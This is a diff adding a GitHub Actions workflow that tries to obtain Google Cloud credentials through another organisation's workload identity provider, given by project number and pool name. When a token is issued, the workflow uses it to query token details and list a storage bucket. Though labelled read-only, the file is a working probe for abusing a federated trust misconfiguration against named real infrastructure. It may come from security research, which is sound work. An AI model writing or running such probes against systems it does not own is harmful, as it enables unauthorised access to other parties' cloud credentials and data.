@@ -1,0 +1,27 @@
+name: wif-probe-gitsec
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attempt WIF auth against Google org-injected workflow provider
+        id: auth
+        continue-on-error: true
+        uses: google-github-actions/auth@c200f3691d83b41bf9bbd8638997a462592937ed # v2 (same as org workflow)
+        with:
+          create_credentials_file: false
+          export_environment_variables: false
+          workload_identity_provider: 'projects/102295818544/locations/global/workloadIdentityPools/gitsec-gha-artifacts/providers/gitsec-gha-artifacts-provider'
+      - name: Report outcome (read-only probes only)
+        run: |
+          echo "AUTH_OUTCOME=${{ steps.auth.outcome }}"
+          if [ "${{ steps.auth.outcome }}" != "success" ]; then echo "TOKEN NOT ISSUED"; exit 0; fi
+          TOKEN="${{ steps.auth.outputs.access_token }}"
+          echo "TOKEN_ISSUED len=${#TOKEN}"
+          curl -s -o /tmp/ti.json -w "tokeninfo_http=%{http_code}\n" "https://oauth2.googleapis.com/tokeninfo?access_token=${TOKEN}" || true
+          head -c 500 /tmp/ti.json; echo
+          curl -s -o /tmp/gcs.json -w "gcs_list_http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" "https://storage.googleapis.com/storage/v1/b/zizmor-7165/o?maxResults=1&fields=kind,items(name)" || true
+          head -c 500 /tmp/gcs.json; echo
